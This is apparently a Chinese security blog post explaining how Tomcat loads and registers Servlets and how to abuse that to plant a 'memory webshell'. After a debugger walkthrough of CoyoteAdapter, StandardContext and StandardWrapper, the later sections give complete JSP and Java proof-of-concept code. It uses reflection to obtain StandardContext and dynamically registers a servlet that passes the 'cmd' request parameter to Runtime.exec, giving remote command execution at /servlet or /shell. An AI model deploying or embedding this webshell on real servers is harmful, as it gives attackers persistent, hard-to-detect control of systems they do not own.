---
title: Servlet型内存马
date: 2026-06-12 08:05:45
updated: 2026-06-25 08:06:30
tags:
  - Web
  - 内存马
  - Tomcat内存马
---
-   参考: [Java内存马系列-05-Tomcat 之 Servlet 型内存马 | Drunkbaby’s Blog](https://drun1baby.github.io/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)

---

## 0x01 前言

感觉 Servlet 内存马这块是千人千语吧，难度实在是不小，光是不同 Tomcat 获取 Context 就需要不少，而且 Servlet 还有动态注册一说，难度还是蛮大的。

-   本文还是从流程 ————> 分析 ————> PoC 这一角度来看内存马

## 0x02 Servlet 创建

早在我最前面的一篇，关于 Java 内存马的基础文章里面提到过 Servlet，在我眼里它是半个中间件。流程是 `init()` —-> `doXXX` —-> `destory()`

这里我们可以先看一下 Servlet 这个接口有哪些方法

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251540203-d5c38ecd-9677-4468-a796-dd16eaa2f0f5.png)

Servlet 接口分别有如下几个方法：

```java
public interface Servlet {
   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。

   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数

   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。

   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.

   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源
}
```

从 Servlet 接口里面我们可以看得出来，如果我们要写恶意代码，应该是写在 service() 方法里面，所以这里我们直接创建一个恶意的 Servlet，代码如下。

```java
import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet("/ServletShell")
public class ServletShell implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            }catch (Exception e) {e.printStackTrace();}
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}

```

加上@WebServlet("/ServletShell")或配置 web.xml。

测试一下，成功！

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782351951939-53735cec-0a2d-4892-8c95-9f5a1f63a35c.png)

## 0x03 Servlet 流程分析

> 前情剧透：Servlet 的流程分析比 Filter 和 Listener 复杂一些

因为 Web 应用程序的顺序是 Listener —-> Filter —-> Servlet，所以我们在调用 Servlet 的时候也会看到之前的 Listener 与 Filter 的流程。

-   如图，这里我先把断点下在了 `service()` 方法，我们可以看到这个地方是有 Filter 的流程的。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251540958-220c08a5-47b2-4740-88d2-6e763c5e4a20.png)

> 正式开始分析，我们把断点下在 `init()` 方法这里。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541338-eda720f7-3d3c-4e20-8dce-a1698449d7dd.png)

### 获取到 HTTP 请求

这里我们肯定还要回去，从前面开始分析。也就是把断点下到 `HTTP11Processor` 类的 `service()` 方法，重新开始调试。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541492-7d51f3db-906e-42f5-a570-efefe8a939ca.png)

这个 `HTTP11Processor` 类是一个网络请求的类，它的作用是处理数据包，而它的 `service()` 方法主要是在处理 HTTP 包的请求头，主要做了赋值的工作，后续会通过 `ByteBuff` 进行数据解析。

所以这一块并不是很重要，都是一些基础的赋值，我们继续往下走，直接到 343 行这里

```java
this.getAdapter().service(this.request, this.response);
```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541583-2b61e097-7c8e-4299-adf8-39e3a8c59d77.png)

跟进，我们去到的是 `CototeAdapter` 类的 `service()` 方法里， CoyoteAdapter 是 Processor 和 Valve 之间的适配器。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541713-160cc31a-7fb2-4826-af09-0ede1ca3a2a8.png)

首先我们关注传参，传入的参数是 `org.apache.coyote.Request` 和 `org.apache.coyote.Response` 类型的对象，后面又进行了 `getNote()` 方法的调用。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541795-0a54dd24-2974-431d-a427-f9558104013e.png)

-   对应的 `getNote()` 方法

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541863-f5da3bde-84b1-4311-9353-a9c9e04198a5.png)

这两个 `getNote()` 方法都是取 notes 数组里指定 pos 的对象，也就是去 `notes[1]` 的这个对象，`note[1]` 的值是在 `CoyoteAdapter#service` 里设值的。

我们继续往下看，如果 `request == null`，进行一系列的赋值。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251541940-9c866f56-7ca3-4648-b6db-775ac6cfe815.png)

后续也都是一些基础的赋值啥的，直到 353 行这里

```java
this.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);
```

这一行是 `service()` 方法里最关键的步骤了

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542010-d7241488-5f42-4111-a15a-8bfa7729ef1b.png)

比较复杂，我们要逐个分析，首先是变量名 connector，它里面存了我们一整个的 HTTP 包。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542083-263efa93-75ca-47d5-9fae-e4ba0ad84e7d.png)

这里师傅们可以逐个点进去看一下

`connector.getService()` 返回的是 Connector 关联的 Service 属性，也就是 `StandardService` 类型的对象。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542407-4bc12306-7e20-48d0-907f-00ab335a4f37.png)

`connector.getService().getContainer()` 返回的是 Service 里的容器 Engine 属性，也就是 `StandardEngine` 对象。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542530-55075d8c-e560-41c9-bc58-4e0aab169e79.png)

`connector.getService().getContainer().getPipeline()` 返回的是 StandardEngine 里的 Pipeline 属性，也就是 `StandardPipeline` 对象。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542608-476643c3-1211-44d5-9079-3ceccd8964dc.png)

返回的是 `StandardPipeline` 的 Valve 类型的数行 first 或者 basic

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542708-c99d15f3-6097-4202-a690-d4ff74097732.png)

这里感觉获取不到什么有用的信息，所以直接跳进 `invoke()` 方法， `StandardEngineValve#inovke()` 进行了 host 相关的简单判断。再继续往下，host 是 Tomcat 内置的 host。

后续的内容就和 Filter 很类似，也就是多个 invoke 的调用，综上，这其实是一个获取到 HTTP 请求，进行预处理的过程。

### 读取 web.xml

这里的断点位置是 `ContextConfig#webConfig()`，读取 web.xml 的流程与 Listener 型内存马里面基本类似，但是还是有点不同。

-   断点位置如图

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542777-48d58c63-88f8-49ff-bca9-436ee6f308b9.png)

开始调试，首先我们获取到了此项目里面的 web.xml 文件

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542880-9e4a1cc7-180b-4d68-bc08-8a063824d15d.png)

中间内容是处理 Filter，Listener 等信息的代码，所以这里我们直接跳过，到 1115 行的 `configureContext(webXml);` 中去

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251542992-4ac0b474-3dca-451d-a85e-6df678da7f84.png)

跟进，我们看到 `configureContext()` 方法也是先获取 Listener，Filter，还有 localeEncodingMappings 等，继续往下走，直到 1281 行这里，开始进行 Servlet 的读取。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543113-67295c02-0aee-4d5f-8200-71ac8dd451e5.png)

### 创建与装载 StandardWrapper

1282 行的语句，createWrapper()，实际上就是创建了 StandardWrpper，后续代码会对它进行加载与处理。

继续往下走，这里很明显，我们将所有的 servlets 保存到了 Wrapper 里面，如图。后面代码做的很大一部分工作都是在把 web.xml 里面的数据写到 StandardWrapper 里面

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543190-320f69fc-87ba-4078-9bcc-b8affa333d8f.png)

我们继续往下看，后续都是一些添加的操作了，这里我们先跳过了。继续往下看，1334 行，将 Wrapper 添加到 context 中，这里对应的是 StandardContext。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543275-cc3b6027-f22c-4ce9-b808-3e84888e2506.png)

后续把 web.xml 中的内容装载进了 StandardWrapper 中。也就是 StandardWrapper 的装载

-   那么这里我们就应该思考了，Wrapper 里面包含了我们的恶意 Servlet 内存马，那 Wrapper 最后是放到哪里去的呢？

其实是 `addChild()` 方法把 Wrapper（这个 Wrapper 后面我们会看到是 StandardWrapper） 放进 StandardContext 里面去了，之后又做了一系列的处理，当时看了很多文章，都交代的很不清楚，我这边带师傅们过一遍。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543384-fab3c27f-e104-4687-8b80-bac877fd7677.png)

紧接上文，我们跟进 `addChild()` 方法，这时候去到的是 `StandardContext` 类的 `addChild()` 方法，它判断这个 Servlet 是否是 JSP 的 Servlet

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543480-5f7f8256-ea30-4dc3-a36d-b24875d8a35f.png)

运行到最后，是这个语句，这里如果环境有问题的师傅可以私聊一下我，我当时也是搭的环境有问题，导致一直在踩坑。

```java
super.addChild(child);
```

跟进去，发现是它的父类，ContainerBase，这是一个抽象类，当时我一度以为我分析错了，结果发现并不是错误。

`ContainerBase` 类的 `addChild()` 方法判断了是否开启全局安全这个配置。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543584-3c706e26-98b1-4ee6-a92d-4c4a6cdb34ea.png)

继续往下，跟进到 `addChildInternal()` 方法里面

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543660-9eb7e185-2d13-47f1-8546-514a37b36b60.png)

它首先判断了 log，也就是日志功能是否开启，这些都是无足轻重的，主要是它在 753 行这里调用了这个语句

```java
child.start();
```

start 方法，就是启动一个线程，在我们 Servlet 里面，也就是开启此 Servlet 的线程，我们跟进去看 Servlet 的线程被启动之后做了什么事。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543721-84bb01b7-b466-4d0a-a3bf-2c8f67afd0ce.png)

这里我们从 `ContainerBase` 类进入到了 `LifecycleBase` 类，

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543783-65add583-b368-4ac3-a591-ca1ab771541c.png)

`LifecycleBase` 类的 `start()` 方法这里先是进行了一些基础的日志判断，后面肯定是会走到 `init()` 方法里面进去的，要不然刚开始 start 的一个 Servlet 直接就 stop，是不合理的。

`init()` 里面就是一些基础的赋值，我们这里就不看了，主要看后面的重点部分 ———— `startInternal()`

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543853-106c7fa4-e135-42e1-8821-d765a957893b.png)

跟进去，这里我们就走到了 `StandardContext#startInternal`，如图

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543917-f314f7d7-4aae-4b4f-97d2-09b78654f8b1.png)

往下走，到 5130 行，调用了 `fireLifecycleEvent()`，它主要做了一个解析 web.xml 的工作。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251543991-117d86fa-b3e7-452d-ad0a-650314a1e5f2.png)

f8 往下走，就会走到 `ContextConfig#configureContext` 方法这里

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544065-1861c8de-f1b8-4981-8b9c-a22e6171a3c5.png)

这里回来，又把 web.xml 的东西装了一遍，过程有点套娃，但是也可以理解。

-   总而言之，`addChild()` 方法把 servlet 放进了 children 里面，children 也就是 StandardWrapper，如图。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544167-ac921ec1-dd6e-4533-8bad-31461535988e.png)

在 `addChild()` 方法之后，调用 `addServletMappingDecoded()` 方法添加映射关系。

将 url 路径和 servlet 类做映射。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544239-bf1e0cbf-e621-4cad-b31f-0cedf991b356.png)

总结一下，Servlet 的生成与动态添加依次进行了以下步骤

-   通过 `context.createWapper()` 创建 Wapper 对象；

-   设置 Servlet 的 `LoadOnStartUp` 的值；

-   设置 Servlet 的 Name ；

-   设置 Servlet 对应的 Class ；

-   将 Servlet 添加到 context 的 children 中；

-   将 url 路径和 servlet 类做映射。

### 加载 Servlets

-   上文我们的分析点是停在了 `addChild()`，以及 `addChild()` 之后的 `addServletMappingDecoded()` 映射。

-   这其实是因为我们当时在 `StandardContext#startInternal` 中，进了 `fireLifecycleEvent()` 方法，又做了一遍 StandardWrapper 装载的工作。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544308-98c14965-218a-4c55-ad8d-7de89a80461b.png)

所以这里我们重新回到 `StandardContext#startInternal` 中，从 `fireLifecycleEvent()` 方法往下走。

继续往下走，无非是一些赋值，都不怎么重要，重要的地方在这里：

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544377-a621debc-7c27-4bcd-94fa-7be0a7f1aa79.png)

跟进，进入到 `loadOnStartup()` 方法

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544472-162ced55-d6a6-46be-9bc1-50cb5cd89631.png)

我们会看到它对 `loadOnStartUp` 这个属性进行了判断

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544540-8f9098c0-39e2-49d6-ba7d-b13d48cde514.png)

对于这个参数：

在 servlet 的配置当中，`<load-on-startup>1</load-on-startup>` 的含义是： 标记容器是否在启动的时候就加载这个 servlet。 当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet； 当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。 正数的值越小，启动该 servlet 的优先级越高。

如果要在 web.xml 里面配置应该如此

```xml
<load-on-startup>1</load-on-startup>

```

这里对应的实际上就是 Tomcat Servlet 的懒加载机制。

-   很明显这里 web.xml 的内容肯定不是我们可控的，所以必须要把恶意的 Servlet 放到最前面去加载。这是我们的一种思路

-   如果不进行相关的操作，其实影响也不算大。

## 0x04 Servlet 内存马编写

上文分析了很长篇幅的 Servlet 工作流程，我们可以总结一下到底做了什么。

### 小结一下 Servlet 的工作流程

首先获取到 HTTP 请求，这里的处理比较简单，和之前 Filter 流程分析是一样的。

-   后面读取到 web.xml，并且在 WebConfig 方法里面还创建了一个 StandardWrapper，而我们的 Servlets 都会保存到这个 StandardWrapper 里面；

-   后续这个 Wrapper 是放到 Context 里面去的，这时候就应该祭出这句名言了：

> “一个 Context 对应于一个 Web 应用，可以包含多个 Wrapper。”  
> “一个 Wrapper 对应一个 Servlet。负责管理 Servlet”

在创建与加载完 StandardWrapper 之后，我们肯定是需要把加载的 Servlets 从 StandardWrapper 里面读取出来，所以这里就到了我们最后的一个过程：加载 Servlets，对应有一个很重要的属性值 ———— `loadOnStartUp`

### 设想 Servlet 内存马的攻击

分析一下应该如何攻击；有这么几个关键点：

-   StandardWrapper

-   StandardContext

-   恶意 Servlet

这里我直接以流程图来演示吧，更为清晰一些。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251544611-dc047116-8827-40fd-8522-d64ec8e67f05.png)

1.  **获取** `**StandardContext**` **对象**

2.  **编写恶意 Servlet**

3.  **通过** `**StandardContext.createWrapper()**` **创建**`**StandardWrapper**` **对象**

4.  **设置** `**StandardWrapper**` **对象的** `**loadOnStartup**` **属性值**

5.  **设置** `**StandardWrapper**` **对象的** `**ServletName**` **属性值**

6.  **设置** `**StandardWrapper**` **对象的** `**ServletClass**` **属性值**

7.  **将** `**StandardWrapper**` **对象添加进** `**StandardContext**` **对象的** `**children**` **属性中**

8.  **通过** `**StandardContext.addServletMappingDecoded()**` **添加对应的路径映射**

### 编写 Servlet 内存马的 PoC（.jsp）

#### 获取 StandardContext 对象

StandardContext对象获取方式多种多样

```java
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>
```

或

```java
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);

    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);

    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
```

#### 编写恶意Servlet

```java
<%!

    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }

%>
```

#### 创建Wrapper对象

```java
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
```

将 Wrapper 添加进 StandardContext

```java
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

#### 完整POC

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>

<%!
    public class ServletShell implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                }catch (Exception e) {e.printStackTrace();}
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%>
<%
    ServletShell shell = new ServletShell();

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(shell.getClass().getSimpleName());
    wrapper.setServlet(shell);
    wrapper.setServletClass(shell.getClass().getName());
%>
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/servlet",shell.getClass().getSimpleName());
%>

```

Servlet 型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的 url 才能触发

Servlet 型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。

先访问 Servlet.jsp，完成内存马的注册

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782359763968-48b306ca-e7c1-4282-872b-58c5b33c5840.png)

再访问/servlet并带上 `cmd` 参数

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782359789994-7c91775d-e38a-422c-b5ec-827774121eb7.png)

### 编写 Servlet 内存马的 PoC（.java）

思想是类似的，师傅们可以自行复现；这里是需要在 web.xml 里面加上 servlet 的调用的。

```java
package tomcatShell.Servlet;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class ServletShell implements Servlet {
    @Override
 public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
 public ServletConfig getServletConfig() {
        return null;
 }

    @Override
 public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        Field reqF = null;
 try {
            reqF = servletRequest.getClass().getDeclaredField("request");
 } catch (NoSuchFieldException e) {
            e.printStackTrace();
 }
        reqF.setAccessible(true);
 Request req = null;
 try {
            req = (Request) reqF.get(servletRequest);
 } catch (IllegalAccessException e) {
            e.printStackTrace();
 }
        StandardContext standardContext = (StandardContext) req.getContext();

 ServletShell servletShell = new ServletShell();
 String name = servletShell.getClass().getSimpleName();

 Wrapper wrapper = standardContext.createWrapper();
 wrapper.setLoadOnStartup(1);
 wrapper.setName(name);
 wrapper.setServlet(servletShell);
 wrapper.setServletClass(servletShell.getClass().getName());
 standardContext.addChild(wrapper);
 standardContext.addServletMappingDecoded("/shell",name);

 String cmd = servletRequest.getParameter("cmd");
 if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
 }catch (IOException e){
                e.printStackTrace();
 }catch (NullPointerException n){
                n.printStackTrace();
 }
        }
    }

    @Override
 public String getServletInfo() {
        return null;
 }

    @Override
 public void destroy() {

    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
        HttpServletResponse var2 = null;

 try {
            Field var3 = var1.getClass().getDeclaredField("response");
 var3.setAccessible(true);
 var2 = (HttpServletResponse)var3.get(var1);
 } catch (Exception var8) {
            try {
                Field var4 = var1.getClass().getDeclaredField("request");
 var4.setAccessible(true);
 Object var5 = var4.get(var1);
 Field var6 = var5.getClass().getDeclaredField("response");
 var6.setAccessible(true);
 var2 = (HttpServletResponse)var6.get(var5);
 } catch (Exception var7) {
            }
        }

        return var2;
 }
}
```

## 0x05 小结

Servlet 型内存马相比于前几种的内存马，更容易被查杀出来，Filter 和 Listener 型内存马更改为简单粗暴，因为它们先于 Servlet 内存马之前插入。

## 0x06 参考资料

[https://goodapple.top/archives/1355](https://goodapple.top/archives/1355)